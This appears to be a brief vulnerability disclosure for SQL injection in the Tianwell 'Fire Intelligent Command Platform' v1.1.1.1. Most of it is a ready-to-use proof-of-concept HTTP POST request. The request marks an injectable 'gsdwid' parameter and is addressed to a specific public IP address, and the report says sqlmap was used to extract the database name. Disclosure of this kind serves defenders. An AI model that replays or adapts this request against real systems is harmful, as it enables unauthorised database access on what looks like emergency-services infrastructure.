There is SQL injection in Tianwell Information Technology Fire Intelligent Command Platform

version:v1.1.1.1

1. The login interface is as shown below
![image](https://github.com/scausoft/cve/assets/40783968/e696c535-4160-40c2-9232-814d89a951d2)

2. Obtain the database name through the following gsdwid parameter. The POC is as follows

POC
```
POST /twms-service-mfs/mfsNotice/page HTTP/1.1
Host: 111.38.174.252:8800
Content-Length: 106
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://111.38.174.252:8800
Content-Type: application/json
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://111.38.174.252:8800/twms-service-mfs/mfsNotice/page
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7
Connection: close

{"currentPage":1,"pageSize":19,"query":{"gsdwid":"1f95b3ec41464ee8b8f223cc41847930*"},"hgubmt748n4":"="}
```
3.Run out the database name through sqlmap
![image](https://github.com/scausoft/cve/assets/40783968/7ee7beda-f62a-4977-a9dd-17fd4f69e224)
![image](https://github.com/scausoft/cve/assets/40783968/cae3cb79-3ec8-46a5-87e5-1c5b2b819d41)
